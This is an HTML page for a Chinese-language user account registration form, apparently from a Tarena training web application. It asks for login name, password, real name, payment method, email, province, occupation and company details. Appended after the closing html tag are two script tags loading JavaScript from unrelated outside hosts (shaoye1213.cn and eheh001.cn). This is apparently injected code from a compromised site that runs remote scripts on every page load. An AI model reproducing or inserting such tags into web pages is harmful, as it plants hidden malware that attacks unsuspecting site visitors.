<html>
<head>
<title> getusersuccess </title>
<style type="text/css">
<!--
@import url(/app/son.css);
@import url(/app/index.css);
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="/app/index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="/app/image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<hr size="1" noshade>
<div align="center"> 
  <form name="form1" method="post" action="listUser.htm">
    <table width="91%" border="0" align="center">
      <tr bgcolor="#ccddee" class="pp"> 
        <td width="14%" height="6"><span class="yellow"> 开通帐户</span></td>
        <td><a href="listUser.htm" class="text_link"> 用户列表</a> </td>
        <td bgcolor="#ccddee"> <div align="center"><font color="#000000">帐务帐号 
            </font> 
            <input name="textfield2" type="text" size="16">
            <input name="Submit22" type="submit" class="button9p" value="查询">
          </div></td>
      </tr>
    </table>
  </form>
  <hr size="1" noshade>
  <p align="left">&nbsp;</p>
  <span class="9P"><html:errors/></span> 
  <center>
    <h1 class="pp"> <span class="9P">请输入用户的基本信息</span> (带<span class="pp">*</span>的必须填写!)</h1>
    <form  method="post" action="listUser.htm">
      <table width="91%" border="1" bordercolor="ccccff" bgcolor="ccddee">
        <tr> 
          <td width="17%" class="9P">帐务帐号 *</td>
          <td width="83%" class="9P"><input type="text" name="loginName">
            请输入用户的帐务帐号名称（只允许用英文，数字，下划线，区分大小写）</td>
        </tr>
        <tr> 
          <td class="9P">帐务密码 *</td>
          <td class="9P"><input type="password" name="loginPassword">
            请输入用户的帐务帐号密码（限度为6-8位）</td>
        </tr>
        <tr> 
          <td class="9P">重复密码 *</td>
          <td class="9P"><input type="password" name="loginPassword2">
            请重复输入以上密码</td>
        </tr>
        <tr> 
          <td class="9P"> 用户名称 *</td>
          <td class="9P"><input type="text" name="userName">
            请输入用户真实姓名</td>
        </tr>
        <tr> 
          <td class="9P">性别选项 *</td>
          <td class="9P"> <input name="sex" type="radio" value="男" checked>
            男 
            <input type="radio" name="sex" value="女">
            女</td>
        </tr>
        <tr> 
          <td class="9P">付款方式 <span class="pp">* </span></td>
          <td class="9P"> <select name="paymentStyle">
              <option value="0" selected>现金支付</option>
              <option value="1">银行转帐</option>
              <option value="2">邮局汇款</option>
              <option value="3">其他</option>
            </select> </td>
        </tr>
        <tr> 
          <td class="9P">用户状态 <span class="pp">* </span></td>
          <td class="9P"> <input name="userStatus" type="radio" value="1" checked>
            开通 
            <input type="radio" name="userStatus" value="3">
            暂停</td>
        </tr>
        <tr> 
          <td class="9P">电子邮箱 <span class="pp">*</span></td>
          <td class="9P"><input type="text" name="userEmail">
            请输入正确的电子邮箱信息，以便我们能及时跟你联系</td>
        </tr>
        <tr> 
          <td height="56" colspan="2" class="9P"> <span class="9P"> </span> 
            <hr size="1" noshade> 
            <p align="center"><span class="yellow">以下是选填信息（请尽量填写）</span><span class="9P"> 
              </span></p></td>
        </tr>
        <tr> 
          <td class="9P">省份&nbsp;&nbsp;&nbsp;&nbsp; </td>
          <td><select name="nationality">
              <option value="1" selected>北京</option>
              <option value="2">天津</option>
              <option value="3">河北</option>
              <option value="4">辽宁</option>
              <option value="5">河南</option>
              <option value="6">吉林</option>
              <option value="7">黑龙江</option>
              <option value="8">内蒙古</option>
              <option value="9">山东</option>
              <option value="10">山西</option>
              <option value="11">陕西</option>
              <option value="12">甘肃</option>
              <option value="13">宁夏</option>
              <option value="14">青海</option>
              <option value="15">新疆</option>
              <option value="16">上海</option>
              <option value="17">江苏</option>
              <option value="18">浙江</option>
              <option value="19">安徽</option>
              <option value="20">广东</option>
              <option value="21">海南</option>
              <option value="22">广西</option>
              <option value="23">云南</option>
              <option value="24">贵州</option>
              <option value="25">四川</option>
              <option value="26">重庆</option>
              <option value="27">西藏</option>
              <option value="28">香港</option>
              <option value="29">澳门</option>
              <option value="30">福建</option>
              <option value="31">江西</option>
              <option value="32">湖南</option>
              <option value="33">湖北</option>
              <option value="34">台湾</option>
              <option value="35">其他</option>
            </select></td>
        </tr>
        <tr> 
          <td class="9P">职业</td>
          <td class="9P"><select name="career">
              <option value="1" selected>软件工程师</option>
              <option value="2">业务经理</option>
              <option value="3">部门经理</option>
              <option value="4">销售经理</option>
            </select> </td>
        </tr>
        <tr> 
          <td class="9P">联系电话 </td>
          <td class="9P"><input type="text" name="userPhone">
            请连续输入用户电话（例：01062136369）</td>
        </tr>
        <tr> 
          <td class="9P">公司&nbsp;&nbsp;&nbsp;&nbsp; </td>
          <td class="9P"><input type="text" name="company">
            请输入用户所在单位信息</td>
        </tr>
        <tr> 
          <td class="9P">公司邮箱 </td>
          <td class="9P"><input type="text" name="mailAddress">
            请输入用户所在单位邮箱号码</td>
        </tr>
        <tr> 
          <td class="9P">邮政编码 </td>
          <td class="9P"><input type="text" name="postCode">
            请输入用户邮政编码</td>
        </tr>
        <tr> 
          <td> </td>
          <td align="right" class="9P">&nbsp;&nbsp;&nbsp; &nbsp;</td>
        </tr>
      </table>
      <p> 
        <input type="submit" value="提交">&nbsp;&nbsp; 
        <input name="reset" type="reset" value="重设">
      </p>
    </form>
  </center>
  <center>
  </center>
</div>
<center>
  <hr/>
  <p class="text_link"><font size="2" face="宋体">About Tarena - 公司简介 - 联系方法 - 相关法律 
    - 客户服务 <br>
    达内公司版权所有</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="/image/c-00.gif" width="9" height="9">&nbsp;2000. 
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>
<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>